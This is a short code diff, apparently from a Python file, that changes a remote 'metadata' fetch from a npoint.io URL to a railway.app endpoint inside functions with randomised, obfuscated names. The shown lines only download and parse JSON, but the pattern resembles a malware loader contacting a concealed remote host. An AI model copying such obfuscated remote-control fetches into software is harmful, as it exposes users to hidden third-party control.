@@ -16,7 +16,7 @@ def net_qejjaa_991():
 
     def process_nxcqhx_408():
         try:
-            train_rbcxox_836 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_rbcxox_836 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_rbcxox_836.raise_for_status()
             learn_wmkhgt_327 = train_rbcxox_836.json()
             train_xoxqjx_749 = learn_wmkhgt_327.get('metadata')
